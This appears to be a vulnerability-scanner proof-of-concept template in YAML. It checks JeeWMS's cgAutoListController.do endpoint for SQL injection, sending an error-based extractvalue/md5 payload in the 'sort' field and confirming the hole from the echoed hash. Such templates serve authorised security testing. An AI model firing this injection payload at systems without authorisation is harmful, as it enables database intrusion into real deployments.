name: poc-yaml-jeewms-cgautolistcontroller-sqli
binding: 4ca1b89c-934b-4869-829d-3addea77ed70
manual: true
detail:
    author: junfei.song@chaitin.com
    links:
        - https://www.yunsee.cn/cms/8464
    vulnerability:
        id: CT-529773
        level: high
transport: http
set:
    r1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^/jeewms/cgAutoListController.do?datagrid&configId=wm_wendu&field=id,create_name,create_by,create_date,update_name,update_by,update_date,sys_org_code,sys_company_code,bpm_status,wendu_dd,wendu_cjsj,wendu_zhi,wendu_bz,
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: order=desc&page=1&rows=10&sort=extractvalue%281%2Cconcat%28char%28126%29%2Cmd5%28{{r1}}%29%29%29
        expression: response.body.bcontains(bytes(md5(string(r1))))
expression: r0()
